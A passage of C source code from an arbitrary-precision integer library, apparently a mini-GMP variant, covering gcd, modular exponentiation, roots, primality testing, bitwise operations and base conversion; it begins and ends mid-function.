                mp_limb_t ul = mpz_tdiv_ui (tu, vl);
                mpz_set_ui (g, mpn_gcd_11 (ul, vl));
                break;
            }
            mpz_sub (tu, tu, tv);
        }
    mpz_clear (tu);
    mpz_clear (tv);
    mpz_mul_2exp (g, g, gz);
}

void
mpz_gcdext (mpz_t g, mpz_t s, mpz_t t, const mpz_t u, const mpz_t v)
{
    mpz_t tu, tv, s0, s1, t0, t1;
    mp_bitcnt_t uz, vz, gz;
    mp_bitcnt_t power;

    if (u->_mp_size == 0)
    {
        /* g = 0 u + sgn(v) v */
        signed long sign = mpz_sgn (v);
        mpz_abs (g, v);
        if (s)
            mpz_set_ui (s, 0);
        if (t)
            mpz_set_si (t, sign);
        return;
    }

    if (v->_mp_size == 0)
    {
        /* g = sgn(u) u + 0 v */
        signed long sign = mpz_sgn (u);
        mpz_abs (g, u);
        if (s)
            mpz_set_si (s, sign);
        if (t)
            mpz_set_ui (t, 0);
        return;
    }

    mpz_init (tu);
    mpz_init (tv);
    mpz_init (s0);
    mpz_init (s1);
    mpz_init (t0);
    mpz_init (t1);

    mpz_abs (tu, u);
    uz = mpz_make_odd (tu);
    mpz_abs (tv, v);
    vz = mpz_make_odd (tv);
    gz = GMP_MIN (uz, vz);

    uz -= gz;
    vz -= gz;

    /* Cofactors corresponding to odd gcd. gz handled later. */
    if (tu->_mp_size < tv->_mp_size)
    {
        mpz_swap (tu, tv);
        MPZ_SRCPTR_SWAP (u, v);
        MPZ_PTR_SWAP (s, t);
        MP_BITCNT_T_SWAP (uz, vz);
    }

    /* Maintain
     *
     * u = t0 tu + t1 tv
     * v = s0 tu + s1 tv
     *
     * where u and v denote the inputs with common factors of two
     * eliminated, and det (s0, t0; s1, t1) = 2^p. Then
     *
     * 2^p tu =  s1 u - t1 v
     * 2^p tv = -s0 u + t0 v
     */

    /* After initial division, tu = q tv + tu', we have
     *
     * u = 2^uz (tu' + q tv)
     * v = 2^vz tv
     *
     * or
     *
     * t0 = 2^uz, t1 = 2^uz q
     * s0 = 0,    s1 = 2^vz
     */

    mpz_setbit (t0, uz);
    mpz_tdiv_qr (t1, tu, tu, tv);
    mpz_mul_2exp (t1, t1, uz);

    mpz_setbit (s1, vz);
    power = uz + vz;

    if (tu->_mp_size > 0)
    {
        mp_bitcnt_t shift;
        shift = mpz_make_odd (tu);
        mpz_mul_2exp (t0, t0, shift);
        mpz_mul_2exp (s0, s0, shift);
        power += shift;

        for (;;)
        {
            int c;
            c = mpz_cmp (tu, tv);
            if (c == 0)
                break;

            if (c < 0)
            {
                /* tv = tv' + tu
                 *
                 * u = t0 tu + t1 (tv' + tu) = (t0 + t1) tu + t1 tv'
                 * v = s0 tu + s1 (tv' + tu) = (s0 + s1) tu + s1 tv' */

                mpz_sub (tv, tv, tu);
                mpz_add (t0, t0, t1);
                mpz_add (s0, s0, s1);

                shift = mpz_make_odd (tv);
                mpz_mul_2exp (t1, t1, shift);
                mpz_mul_2exp (s1, s1, shift);
            }
            else
            {
                mpz_sub (tu, tu, tv);
                mpz_add (t1, t0, t1);
                mpz_add (s1, s0, s1);

                shift = mpz_make_odd (tu);
                mpz_mul_2exp (t0, t0, shift);
                mpz_mul_2exp (s0, s0, shift);
            }
            power += shift;
        }
    }

    /* Now tv = odd part of gcd, and -s0 and t0 are corresponding
       cofactors. */

    mpz_mul_2exp (tv, tv, gz);
    mpz_neg (s0, s0);

    /* 2^p g = s0 u + t0 v. Eliminate one factor of two at a time. To
       adjust cofactors, we need u / g and v / g */

    mpz_divexact (s1, v, tv);
    mpz_abs (s1, s1);
    mpz_divexact (t1, u, tv);
    mpz_abs (t1, t1);

    while (power-- > 0)
    {
        /* s0 u + t0 v = (s0 - v/g) u - (t0 + u/g) v */
        if (mpz_odd_p (s0) || mpz_odd_p (t0))
        {
            mpz_sub (s0, s0, s1);
            mpz_add (t0, t0, t1);
        }
        mpz_divexact_ui (s0, s0, 2);
        mpz_divexact_ui (t0, t0, 2);
    }

    /* Arrange so that |s| < |u| / 2g */
    mpz_add (s1, s0, s1);
    if (mpz_cmpabs (s0, s1) > 0)
    {
        mpz_swap (s0, s1);
        mpz_sub (t0, t0, t1);
    }
    if (u->_mp_size < 0)
        mpz_neg (s0, s0);
    if (v->_mp_size < 0)
        mpz_neg (t0, t0);

    mpz_swap (g, tv);
    if (s)
        mpz_swap (s, s0);
    if (t)
        mpz_swap (t, t0);

    mpz_clear (tu);
    mpz_clear (tv);
    mpz_clear (s0);
    mpz_clear (s1);
    mpz_clear (t0);
    mpz_clear (t1);
}

void
mpz_lcm (mpz_t r, const mpz_t u, const mpz_t v)
{
    mpz_t g;

    if (u->_mp_size == 0 || v->_mp_size == 0)
    {
        r->_mp_size = 0;
        return;
    }

    mpz_init (g);

    mpz_gcd (g, u, v);
    mpz_divexact (g, u, g);
    mpz_mul (r, g, v);

    mpz_clear (g);
    mpz_abs (r, r);
}

void
mpz_lcm_ui (mpz_t r, const mpz_t u, uint64_t v)
{
    if (v == 0 || u->_mp_size == 0)
    {
        r->_mp_size = 0;
        return;
    }

    v /= mpz_gcd_ui (NULL, u, v);
    mpz_mul_ui (r, u, v);

    mpz_abs (r, r);
}

int
mpz_invert (mpz_t r, const mpz_t u, const mpz_t m)
{
    mpz_t g, tr;
    int invertible;

    if (u->_mp_size == 0 || mpz_cmpabs_ui (m, 1) <= 0)
        return 0;

    mpz_init (g);
    mpz_init (tr);

    mpz_gcdext (g, tr, NULL, u, m);
    invertible = (mpz_cmp_ui (g, 1) == 0);

    if (invertible)
    {
        if (tr->_mp_size < 0)
        {
            if (m->_mp_size >= 0)
                mpz_add (tr, tr, m);
            else
                mpz_sub (tr, tr, m);
        }
        mpz_swap (r, tr);
    }

    mpz_clear (g);
    mpz_clear (tr);
    return invertible;
}


/* Higher level operations (sqrt, pow and root) */

void
mpz_pow_ui (mpz_t r, const mpz_t b, uint64_t e)
{
    uint64_t bit;
    mpz_t tr;
    mpz_init_set_ui (tr, 1);

    bit = GMP_ULONG_HIGHBIT;
    do
    {
        mpz_mul (tr, tr, tr);
        if (e & bit)
            mpz_mul (tr, tr, b);
        bit >>= 1;
    }
    while (bit > 0);

    mpz_swap (r, tr);
    mpz_clear (tr);
}

void
mpz_ui_pow_ui (mpz_t r, uint64_t blimb, uint64_t e)
{
    mpz_t b;
    mpz_pow_ui (r, mpz_roinit_n (b, &blimb, 1), e);
}

void
mpz_powm (mpz_t r, const mpz_t b, const mpz_t e, const mpz_t m)
{
    mpz_t tr;
    mpz_t base;
    mp_size_t en, mn;
    mp_srcptr mp;
    struct gmp_div_inverse minv;
    unsigned shift;
    mp_ptr tp = NULL;

    en = GMP_ABS (e->_mp_size);
    mn = GMP_ABS (m->_mp_size);
    if (mn == 0)
        gmp_die ("mpz_powm: Zero modulo.");

    if (en == 0)
    {
        mpz_set_ui (r, 1);
        return;
    }

    mp = m->_mp_d;
    mpn_div_qr_invert (&minv, mp, mn);
    shift = minv.shift;

    if (shift > 0)
    {
        /* To avoid shifts, we do all our reductions, except the final
       one, using a *normalized* m. */
        minv.shift = 0;

        tp = gmp_xalloc_limbs (mn);
        gmp_assert_nocarry (mpn_lshift (tp, mp, mn, shift));
        mp = tp;
    }

    mpz_init (base);

    if (e->_mp_size < 0)
    {
        if (!mpz_invert (base, b, m))
            gmp_die ("mpz_powm: Negative exponent and non-invertible base.");
    }
    else
    {
        mp_size_t bn;
        mpz_abs (base, b);

        bn = base->_mp_size;
        if (bn >= mn)
        {
            mpn_div_qr_preinv (NULL, base->_mp_d, base->_mp_size, mp, mn, &minv);
            bn = mn;
        }

        /* We have reduced the absolute value. Now take care of the
       sign. Note that we get zero represented non-canonically as
       m. */
        if (b->_mp_size < 0)
        {
            mp_ptr bp = MPZ_REALLOC (base, mn);
            gmp_assert_nocarry (mpn_sub (bp, mp, mn, bp, bn));
            bn = mn;
        }
        base->_mp_size = mpn_normalized_size (base->_mp_d, bn);
    }
    mpz_init_set_ui (tr, 1);

    while (--en >= 0)
    {
        mp_limb_t w = e->_mp_d[en];
        mp_limb_t bit;

        bit = GMP_LIMB_HIGHBIT;
        do
        {
            mpz_mul (tr, tr, tr);
            if (w & bit)
                mpz_mul (tr, tr, base);
            if (tr->_mp_size > mn)
            {
                mpn_div_qr_preinv (NULL, tr->_mp_d, tr->_mp_size, mp, mn, &minv);
                tr->_mp_size = mpn_normalized_size (tr->_mp_d, mn);
            }
            bit >>= 1;
        }
        while (bit > 0);
    }

    /* Final reduction */
    if (tr->_mp_size >= mn)
    {
        minv.shift = shift;
        mpn_div_qr_preinv (NULL, tr->_mp_d, tr->_mp_size, mp, mn, &minv);
        tr->_mp_size = mpn_normalized_size (tr->_mp_d, mn);
    }
    if (tp)
        gmp_free (tp);

    mpz_swap (r, tr);
    mpz_clear (tr);
    mpz_clear (base);
}

void
mpz_powm_ui (mpz_t r, const mpz_t b, uint64_t elimb, const mpz_t m)
{
    mpz_t e;
    mpz_powm (r, b, mpz_roinit_n (e, &elimb, 1), m);
}

/* x=trunc(y^(1/z)), r=y-x^z */
void
mpz_rootrem (mpz_t x, mpz_t r, const mpz_t y, uint64_t z)
{
    int sgn;
    mpz_t t, u;

    sgn = y->_mp_size < 0;
    if ((~z & sgn) != 0)
        gmp_die ("mpz_rootrem: Negative argument, with even root.");
    if (z == 0)
        gmp_die ("mpz_rootrem: Zeroth root.");

    if (mpz_cmpabs_ui (y, 1) <= 0) {
        if (x)
            mpz_set (x, y);
        if (r)
            r->_mp_size = 0;
        return;
    }

    mpz_init (u);
    mpz_init (t);
    mpz_setbit (t, mpz_sizeinbase (y, 2) / z + 1);

    if (z == 2) /* simplify sqrt loop: z-1 == 1 */
        do {
            mpz_swap (u, t);			/* u = x */
            mpz_tdiv_q (t, y, u);		/* t = y/x */
            mpz_add (t, t, u);		/* t = y/x + x */
            mpz_tdiv_q_2exp (t, t, 1);	/* x'= (y/x + x)/2 */
        } while (mpz_cmpabs (t, u) < 0);	/* |x'| < |x| */
    else /* z != 2 */ {
        mpz_t v;

        mpz_init (v);
        if (sgn)
            mpz_neg (t, t);

        do {
            mpz_swap (u, t);			/* u = x */
            mpz_pow_ui (t, u, z - 1);		/* t = x^(z-1) */
            mpz_tdiv_q (t, y, t);		/* t = y/x^(z-1) */
            mpz_mul_ui (v, u, z - 1);		/* v = x*(z-1) */
            mpz_add (t, t, v);		/* t = y/x^(z-1) + x*(z-1) */
            mpz_tdiv_q_ui (t, t, z);		/* x'=(y/x^(z-1) + x*(z-1))/z */
        } while (mpz_cmpabs (t, u) < 0);	/* |x'| < |x| */

        mpz_clear (v);
    }

    if (r) {
        mpz_pow_ui (t, u, z);
        mpz_sub (r, y, t);
    }
    if (x)
        mpz_swap (x, u);
    mpz_clear (u);
    mpz_clear (t);
}

int
mpz_root (mpz_t x, const mpz_t y, uint64_t z)
{
    int res;
    mpz_t r;

    mpz_init (r);
    mpz_rootrem (x, r, y, z);
    res = r->_mp_size == 0;
    mpz_clear (r);

    return res;
}

/* Compute s = floor(sqrt(u)) and r = u - s^2. Allows r == NULL */
void
mpz_sqrtrem (mpz_t s, mpz_t r, const mpz_t u)
{
    mpz_rootrem (s, r, u, 2);
}

void
mpz_sqrt (mpz_t s, const mpz_t u)
{
    mpz_rootrem (s, NULL, u, 2);
}

int
mpz_perfect_square_p (const mpz_t u)
{
    if (u->_mp_size <= 0)
        return (u->_mp_size == 0);
    else
        return mpz_root (NULL, u, 2);
}

int
mpn_perfect_square_p (mp_srcptr p, mp_size_t n)
{
    mpz_t t;

    assert (n > 0);
    assert (p [n-1] != 0);
    return mpz_root (NULL, mpz_roinit_n (t, p, n), 2);
}

mp_size_t
mpn_sqrtrem (mp_ptr sp, mp_ptr rp, mp_srcptr p, mp_size_t n)
{
    mpz_t s, r, u;
    mp_size_t res;

    assert (n > 0);
    assert (p [n-1] != 0);

    mpz_init (r);
    mpz_init (s);
    mpz_rootrem (s, r, mpz_roinit_n (u, p, n), 2);

    assert (s->_mp_size == (n+1)/2);
    mpn_copyd (sp, s->_mp_d, s->_mp_size);
    mpz_clear (s);
    res = r->_mp_size;
    if (rp)
        mpn_copyd (rp, r->_mp_d, res);
    mpz_clear (r);
    return res;
}

/* Combinatorics */

void
mpz_fac_ui (mpz_t x, uint64_t n)
{
    mpz_set_ui (x, n + (n == 0));
    while (n > 2)
        mpz_mul_ui (x, x, --n);
}

void
mpz_bin_uiui (mpz_t r, uint64_t n, uint64_t k)
{
    mpz_t t;

    mpz_set_ui (r, k <= n);

    if (k > (n >> 1))
        k = (k <= n) ? n - k : 0;

    mpz_init (t);
    mpz_fac_ui (t, k);

    for (; k > 0; k--)
        mpz_mul_ui (r, r, n--);

    mpz_divexact (r, r, t);
    mpz_clear (t);
}


/* Primality testing */
static int
gmp_millerrabin (const mpz_t n, const mpz_t nm1, mpz_t y,
                 const mpz_t q, mp_bitcnt_t k)
{
    assert (k > 0);

    /* Caller must initialize y to the base. */
    mpz_powm (y, y, q, n);

    if (mpz_cmp_ui (y, 1) == 0 || mpz_cmp (y, nm1) == 0)
        return 1;

    while (--k > 0)
    {
        mpz_powm_ui (y, y, 2, n);
        if (mpz_cmp (y, nm1) == 0)
            return 1;
        /* y == 1 means that the previous y was a non-trivial square root
       of 1 (mod n). y == 0 means that n is a power of the base.
       In either case, n is not prime. */
        if (mpz_cmp_ui (y, 1) <= 0)
            return 0;
    }
    return 0;
}

/* This product is 0xc0cfd797, and fits in 32 bits. */
#define GMP_PRIME_PRODUCT \
  (3UL*5UL*7UL*11UL*13UL*17UL*19UL*23UL*29UL)

/* Bit (p+1)/2 is set, for each odd prime <= 61 */
#define GMP_PRIME_MASK 0xc96996dcUL

int
mpz_probab_prime_p (const mpz_t n, int reps)
{
    mpz_t nm1;
    mpz_t q;
    mpz_t y;
    mp_bitcnt_t k;
    int is_prime;
    int j;

    /* Note that we use the absolute value of n only, for compatibility
       with the real GMP. */
    if (mpz_even_p (n))
        return (mpz_cmpabs_ui (n, 2) == 0) ? 2 : 0;

    /* Above test excludes n == 0 */
    assert (n->_mp_size != 0);

    if (mpz_cmpabs_ui (n, 64) < 0)
        return (GMP_PRIME_MASK >> (n->_mp_d[0] >> 1)) & 2;

    if (mpz_gcd_ui (NULL, n, GMP_PRIME_PRODUCT) != 1)
        return 0;

    /* All prime factors are >= 31. */
    if (mpz_cmpabs_ui (n, 31*31) < 0)
        return 2;

    /* Use Miller-Rabin, with a deterministic sequence of bases, a[j] =
       j^2 + j + 41 using Euler's polynomial. We potentially stop early,
       if a[j] >= n - 1. Since n >= 31*31, this can happen only if reps >
       30 (a[30] == 971 > 31*31 == 961). */

    mpz_init (nm1);
    mpz_init (q);
    mpz_init (y);

    /* Find q and k, where q is odd and n = 1 + 2**k * q.  */
    nm1->_mp_size = mpz_abs_sub_ui (nm1, n, 1);
    k = mpz_scan1 (nm1, 0);
    mpz_tdiv_q_2exp (q, nm1, k);

    for (j = 0, is_prime = 1; is_prime & (j < reps); j++)
    {
        mpz_set_ui (y, (uint64_t) j*j+j+41);
        if (mpz_cmp (y, nm1) >= 0)
        {
            /* Don't try any further bases. This "early" break does not affect
               the result for any reasonable reps value (<=5000 was tested) */
            assert (j >= 30);
            break;
        }
        is_prime = gmp_millerrabin (n, nm1, y, q, k);
    }
    mpz_clear (nm1);
    mpz_clear (q);
    mpz_clear (y);

    return is_prime;
}


/* Logical operations and bit manipulation. */

/* Numbers are treated as if represented in two's complement (and
   infinitely sign extended). For a negative values we get the two's
   complement from -x = ~x + 1, where ~ is bitwise complement.
   Negation transforms

     xxxx10...0

   into

     yyyy10...0

   where yyyy is the bitwise complement of xxxx. So least significant
   bits, up to and including the first one bit, are unchanged, and
   the more significant bits are all complemented.

   To change a bit from zero to one in a negative number, subtract the
   corresponding power of two from the absolute value. This can never
   underflow. To change a bit from one to zero, add the corresponding
   power of two, and this might overflow. E.g., if x = -001111, the
   two's complement is 110001. Clearing the least significant bit, we
   get two's complement 110000, and -010000. */

int
mpz_tstbit (const mpz_t d, mp_bitcnt_t bit_index)
{
    mp_size_t limb_index;
    unsigned shift;
    mp_size_t ds;
    mp_size_t dn;
    mp_limb_t w;
    int bit;

    ds = d->_mp_size;
    dn = GMP_ABS (ds);
    limb_index = bit_index / GMP_LIMB_BITS;
    if (limb_index >= dn)
        return ds < 0;

    shift = bit_index % GMP_LIMB_BITS;
    w = d->_mp_d[limb_index];
    bit = (w >> shift) & 1;

    if (ds < 0)
    {
        /* d < 0. Check if any of the bits below is set: If so, our bit
       must be complemented. */
        if (shift > 0 && (w << (GMP_LIMB_BITS - shift)) > 0)
            return bit ^ 1;
        while (--limb_index >= 0)
            if (d->_mp_d[limb_index] > 0)
                return bit ^ 1;
    }
    return bit;
}

static void
mpz_abs_add_bit (mpz_t d, mp_bitcnt_t bit_index)
{
    mp_size_t dn, limb_index;
    mp_limb_t bit;
    mp_ptr dp;

    dn = GMP_ABS (d->_mp_size);

    limb_index = bit_index / GMP_LIMB_BITS;
    bit = (mp_limb_t) 1 << (bit_index % GMP_LIMB_BITS);

    if (limb_index >= dn)
    {
        mp_size_t i;
        /* The bit should be set outside of the end of the number.
       We have to increase the size of the number. */
        dp = MPZ_REALLOC (d, limb_index + 1);

        dp[limb_index] = bit;
        for (i = dn; i < limb_index; i++)
            dp[i] = 0;
        dn = limb_index + 1;
    }
    else
    {
        mp_limb_t cy;

        dp = d->_mp_d;

        cy = mpn_add_1 (dp + limb_index, dp + limb_index, dn - limb_index, bit);
        if (cy > 0)
        {
            dp = MPZ_REALLOC (d, dn + 1);
            dp[dn++] = cy;
        }
    }

    d->_mp_size = (d->_mp_size < 0) ? - dn : dn;
}

static void
mpz_abs_sub_bit (mpz_t d, mp_bitcnt_t bit_index)
{
    mp_size_t dn, limb_index;
    mp_ptr dp;
    mp_limb_t bit;

    dn = GMP_ABS (d->_mp_size);
    dp = d->_mp_d;

    limb_index = bit_index / GMP_LIMB_BITS;
    bit = (mp_limb_t) 1 << (bit_index % GMP_LIMB_BITS);

    assert (limb_index < dn);

    gmp_assert_nocarry (mpn_sub_1 (dp + limb_index, dp + limb_index,
                                   dn - limb_index, bit));
    dn = mpn_normalized_size (dp, dn);
    d->_mp_size = (d->_mp_size < 0) ? - dn : dn;
}

void
mpz_setbit (mpz_t d, mp_bitcnt_t bit_index)
{
    if (!mpz_tstbit (d, bit_index))
    {
        if (d->_mp_size >= 0)
            mpz_abs_add_bit (d, bit_index);
        else
            mpz_abs_sub_bit (d, bit_index);
    }
}

void
mpz_clrbit (mpz_t d, mp_bitcnt_t bit_index)
{
    if (mpz_tstbit (d, bit_index))
    {
        if (d->_mp_size >= 0)
            mpz_abs_sub_bit (d, bit_index);
        else
            mpz_abs_add_bit (d, bit_index);
    }
}

void
mpz_combit (mpz_t d, mp_bitcnt_t bit_index)
{
    if (mpz_tstbit (d, bit_index) ^ (d->_mp_size < 0))
        mpz_abs_sub_bit (d, bit_index);
    else
        mpz_abs_add_bit (d, bit_index);
}

void
mpz_com (mpz_t r, const mpz_t u)
{
    mpz_neg (r, u);
    mpz_sub_ui (r, r, 1);
}

void
mpz_and (mpz_t r, const mpz_t u, const mpz_t v)
{
    mp_size_t un, vn, rn, i;
    mp_ptr up, vp, rp;

    mp_limb_t ux, vx, rx;
    mp_limb_t uc, vc, rc;
    mp_limb_t ul, vl, rl;

    un = GMP_ABS (u->_mp_size);
    vn = GMP_ABS (v->_mp_size);
    if (un < vn)
    {
        MPZ_SRCPTR_SWAP (u, v);
        MP_SIZE_T_SWAP (un, vn);
    }
    if (vn == 0)
    {
        r->_mp_size = 0;
        return;
    }

    uc = u->_mp_size < 0;
    vc = v->_mp_size < 0;
    rc = uc & vc;

    ux = -uc;
    vx = -vc;
    rx = -rc;

    /* If the smaller input is positive, higher limbs don't matter. */
    rn = vx ? un : vn;

    rp = MPZ_REALLOC (r, rn + (mp_size_t) rc);

    up = u->_mp_d;
    vp = v->_mp_d;

    i = 0;
    do
    {
        ul = (up[i] ^ ux) + uc;
        uc = ul < uc;

        vl = (vp[i] ^ vx) + vc;
        vc = vl < vc;

        rl = ( (ul & vl) ^ rx) + rc;
        rc = rl < rc;
        rp[i] = rl;
    }
    while (++i < vn);
    assert (vc == 0);

    for (; i < rn; i++)
    {
        ul = (up[i] ^ ux) + uc;
        uc = ul < uc;

        rl = ( (ul & vx) ^ rx) + rc;
        rc = rl < rc;
        rp[i] = rl;
    }
    if (rc)
        rp[rn++] = rc;
    else
        rn = mpn_normalized_size (rp, rn);

    r->_mp_size = rx ? -rn : rn;
}

void
mpz_ior (mpz_t r, const mpz_t u, const mpz_t v)
{
    mp_size_t un, vn, rn, i;
    mp_ptr up, vp, rp;

    mp_limb_t ux, vx, rx;
    mp_limb_t uc, vc, rc;
    mp_limb_t ul, vl, rl;

    un = GMP_ABS (u->_mp_size);
    vn = GMP_ABS (v->_mp_size);
    if (un < vn)
    {
        MPZ_SRCPTR_SWAP (u, v);
        MP_SIZE_T_SWAP (un, vn);
    }
    if (vn == 0)
    {
        mpz_set (r, u);
        return;
    }

    uc = u->_mp_size < 0;
    vc = v->_mp_size < 0;
    rc = uc | vc;

    ux = -uc;
    vx = -vc;
    rx = -rc;

    /* If the smaller input is negative, by sign extension higher limbs
       don't matter. */
    rn = vx ? vn : un;

    rp = MPZ_REALLOC (r, rn + (mp_size_t) rc);

    up = u->_mp_d;
    vp = v->_mp_d;

    i = 0;
    do
    {
        ul = (up[i] ^ ux) + uc;
        uc = ul < uc;

        vl = (vp[i] ^ vx) + vc;
        vc = vl < vc;

        rl = ( (ul | vl) ^ rx) + rc;
        rc = rl < rc;
        rp[i] = rl;
    }
    while (++i < vn);
    assert (vc == 0);

    for (; i < rn; i++)
    {
        ul = (up[i] ^ ux) + uc;
        uc = ul < uc;

        rl = ( (ul | vx) ^ rx) + rc;
        rc = rl < rc;
        rp[i] = rl;
    }
    if (rc)
        rp[rn++] = rc;
    else
        rn = mpn_normalized_size (rp, rn);

    r->_mp_size = rx ? -rn : rn;
}

void
mpz_xor (mpz_t r, const mpz_t u, const mpz_t v)
{
    mp_size_t un, vn, i;
    mp_ptr up, vp, rp;

    mp_limb_t ux, vx, rx;
    mp_limb_t uc, vc, rc;
    mp_limb_t ul, vl, rl;

    un = GMP_ABS (u->_mp_size);
    vn = GMP_ABS (v->_mp_size);
    if (un < vn)
    {
        MPZ_SRCPTR_SWAP (u, v);
        MP_SIZE_T_SWAP (un, vn);
    }
    if (vn == 0)
    {
        mpz_set (r, u);
        return;
    }

    uc = u->_mp_size < 0;
    vc = v->_mp_size < 0;
    rc = uc ^ vc;

    ux = -uc;
    vx = -vc;
    rx = -rc;

    rp = MPZ_REALLOC (r, un + (mp_size_t) rc);

    up = u->_mp_d;
    vp = v->_mp_d;

    i = 0;
    do
    {
        ul = (up[i] ^ ux) + uc;
        uc = ul < uc;

        vl = (vp[i] ^ vx) + vc;
        vc = vl < vc;

        rl = (ul ^ vl ^ rx) + rc;
        rc = rl < rc;
        rp[i] = rl;
    }
    while (++i < vn);
    assert (vc == 0);

    for (; i < un; i++)
    {
        ul = (up[i] ^ ux) + uc;
        uc = ul < uc;

        rl = (ul ^ ux) + rc;
        rc = rl < rc;
        rp[i] = rl;
    }
    if (rc)
        rp[un++] = rc;
    else
        un = mpn_normalized_size (rp, un);

    r->_mp_size = rx ? -un : un;
}

static unsigned
gmp_popcount_limb (mp_limb_t x)
{
    unsigned c;

    /* Do 16 bits at a time, to avoid limb-sized constants. */
    for (c = 0; x > 0; x >>= 16)
    {
        unsigned w = ((x >> 1) & 0x5555) + (x & 0x5555);
        w = ((w >> 2) & 0x3333) + (w & 0x3333);
        w = ((w >> 4) & 0x0f0f) + (w & 0x0f0f);
        w = (w >> 8) + (w & 0x00ff);
        c += w;
    }
    return c;
}

mp_bitcnt_t
mpn_popcount (mp_srcptr p, mp_size_t n)
{
    mp_size_t i;
    mp_bitcnt_t c;

    for (c = 0, i = 0; i < n; i++)
        c += gmp_popcount_limb (p[i]);

    return c;
}

mp_bitcnt_t
mpz_popcount (const mpz_t u)
{
    mp_size_t un;

    un = u->_mp_size;

    if (un < 0)
        return ~(mp_bitcnt_t) 0;

    return mpn_popcount (u->_mp_d, un);
}

mp_bitcnt_t
mpz_hamdist (const mpz_t u, const mpz_t v)
{
    mp_size_t un, vn, i;
    mp_limb_t uc, vc, ul, vl, comp;
    mp_srcptr up, vp;
    mp_bitcnt_t c;

    un = u->_mp_size;
    vn = v->_mp_size;

    if ( (un ^ vn) < 0)
        return ~(mp_bitcnt_t) 0;

    comp = - (uc = vc = (un < 0));
    if (uc)
    {
        assert (vn < 0);
        un = -un;
        vn = -vn;
    }

    up = u->_mp_d;
    vp = v->_mp_d;

    if (un < vn)
        MPN_SRCPTR_SWAP (up, un, vp, vn);

    for (i = 0, c = 0; i < vn; i++)
    {
        ul = (up[i] ^ comp) + uc;
        uc = ul < uc;

        vl = (vp[i] ^ comp) + vc;
        vc = vl < vc;

        c += gmp_popcount_limb (ul ^ vl);
    }
    assert (vc == 0);

    for (; i < un; i++)
    {
        ul = (up[i] ^ comp) + uc;
        uc = ul < uc;

        c += gmp_popcount_limb (ul ^ comp);
    }

    return c;
}

mp_bitcnt_t
mpz_scan1 (const mpz_t u, mp_bitcnt_t starting_bit)
{
    mp_ptr up;
    mp_size_t us, un, i;
    mp_limb_t limb, ux;

    us = u->_mp_size;
    un = GMP_ABS (us);
    i = starting_bit / GMP_LIMB_BITS;

    /* Past the end there's no 1 bits for u>=0, or an immediate 1 bit
       for u<0. Notice this test picks up any u==0 too. */
    if (i >= un)
        return (us >= 0 ? ~(mp_bitcnt_t) 0 : starting_bit);

    up = u->_mp_d;
    ux = 0;
    limb = up[i];

    if (starting_bit != 0)
    {
        if (us < 0)
        {
            ux = mpn_zero_p (up, i);
            limb = ~ limb + ux;
            ux = - (mp_limb_t) (limb >= ux);
        }

        /* Mask to 0 all bits before starting_bit, thus ignoring them. */
        limb &= (GMP_LIMB_MAX << (starting_bit % GMP_LIMB_BITS));
    }

    return mpn_common_scan (limb, i, up, un, ux);
}

mp_bitcnt_t
mpz_scan0 (const mpz_t u, mp_bitcnt_t starting_bit)
{
    mp_ptr up;
    mp_size_t us, un, i;
    mp_limb_t limb, ux;

    us = u->_mp_size;
    ux = - (mp_limb_t) (us >= 0);
    un = GMP_ABS (us);
    i = starting_bit / GMP_LIMB_BITS;

    /* When past end, there's an immediate 0 bit for u>=0, or no 0 bits for
       u<0.  Notice this test picks up all cases of u==0 too. */
    if (i >= un)
        return (ux ? starting_bit : ~(mp_bitcnt_t) 0);

    up = u->_mp_d;
    limb = up[i] ^ ux;

    if (ux == 0)
        limb -= mpn_zero_p (up, i); /* limb = ~(~limb + zero_p) */

    /* Mask all bits before starting_bit, thus ignoring them. */
    limb &= (GMP_LIMB_MAX << (starting_bit % GMP_LIMB_BITS));

    return mpn_common_scan (limb, i, up, un, ux);
}


/* MPZ base conversion. */

size_t
mpz_sizeinbase (const mpz_t u, int base)
{
    mp_size_t un;
    mp_srcptr up;
    mp_ptr tp;
    mp_bitcnt_t bits;
    struct gmp_div_inverse bi;
    size_t ndigits;

    assert (base >= 2);
    assert (base <= 36);

    un = GMP_ABS (u->_mp_size);
    if (un == 0)
        return 1;

    up = u->_mp_d;

    bits = (un - 1) * GMP_LIMB_BITS + mpn_limb_size_in_base_2 (up[un-1]);
    switch (base)
    {
        case 2:
            return bits;
        case 4:
            return (bits + 1) / 2;
        case 8:
            return (bits + 2) / 3;
        case 16:
            return (bits + 3) / 4;
        case 32:
            return (bits + 4) / 5;
            /* FIXME: Do something more clever for the common case of base
           10. */
    }

    tp = gmp_xalloc_limbs (un);
    mpn_copyi (tp, up, un);
    mpn_div_qr_1_invert (&bi, base);

    ndigits = 0;
    do
    {
        ndigits++;
        mpn_div_qr_1_preinv (tp, tp, un, &bi);
        un -= (tp[un-1] == 0);
    }
    while (un > 0);

    gmp_free (tp);
    return ndigits;
}

char *
mpz_get_str (char *sp, int base, const mpz_t u)
{
    unsigned bits;
    const char *digits;
    mp_size_t un;
    size_t i, sn;

    if (base >= 0)
    {
        digits = "0123456789abcdefghijklmnopqrstuvwxyz";
    }
    else
    {
        base = -base;
        digits = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    }
    if (base <= 1)
        base = 10;
    if (base > 36)
        return NULL;

    sn = 1 + mpz_sizeinbase (u, base);
    if (!sp)
        sp = (char *) gmp_xalloc (1 + sn);

    un = GMP_ABS (u->_mp_size);

    if (un == 0)
    {
        sp[0] = '0';
        sp[1] = '\0';
        return sp;
    }

    i = 0;

    if (u->_mp_size < 0)
        sp[i++] = '-';

    bits = mpn_base_power_of_two_p (base);

    if (bits)
        /* Not modified in this case. */
        sn = i + mpn_get_str_bits ((unsigned char *) sp + i, bits, u->_mp_d, un);
    else
    {
        struct mpn_base_info info;
        mp_ptr tp;

        mpn_get_base_info (&info, base);
        tp = gmp_xalloc_limbs (un);
        mpn_copyi (tp, u->_mp_d, un);

        sn = i + mpn_get_str_other ((unsigned char *) sp + i, base, &info, tp, un);
        gmp_free (tp);
    }

    for (; i < sn; i++)
        sp[i] = digits[(unsigned char) sp[i]];

    sp[sn] = '\0';
    return sp;
}

int
mpz_set_str (mpz_t r, const char *sp, int base)
{
    unsigned bits;
    mp_size_t rn, alloc;
    mp_ptr rp;
    size_t sn;
    int sign;
    unsigned char *dp;

    assert (base == 0 || (base >= 2 && base <= 36));

    while (isspace( (unsigned char) *sp))
        sp++;

    sign = (*sp == '-');
    sp += sign;

    if (base == 0)
    {
        if (*sp == '0')
        {
            sp++;
            if (*sp == 'x' || *sp == 'X')
            {
                base = 16;
                sp++;
            }
            else if (*sp == 'b' || *sp == 'B')
            {
